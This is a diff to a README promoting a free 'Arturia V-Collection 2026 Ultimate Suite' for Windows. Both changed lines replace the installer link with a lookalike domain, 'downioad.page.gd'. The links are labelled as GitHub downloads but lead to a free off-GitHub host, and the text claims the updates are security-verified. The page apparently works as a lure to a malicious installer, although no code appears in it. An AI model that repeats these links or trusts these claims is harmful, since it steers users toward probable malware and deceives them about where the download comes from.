@@ -2,7 +2,7 @@
 
 Welcome to the Arturia V-Collection 2026 Ultimate Suite, a powerful and intuitive tool designed to elevate your music production experience. This suite provides a range of features to optimize, customize, and manage your Arturia virtual instruments, ensuring peak performance on Windows 10 and 11 systems. Last updated in 2026, it incorporates the latest enhancements for a seamless workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -51,7 +51,7 @@ A: Ensure that your Arturia V-Collection is properly installed and activated. Th
 
 For the latest version of the Arturia V-Collection 2026 Ultimate Suite, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Ensure that you download only from the provided link to avoid any unauthorized versions. The current release date is 2026, and all updates are verified for security and performance. This tool is free to use for personal music production on Windows desktops, enhancing your creative workflow without compromising system stability.
 
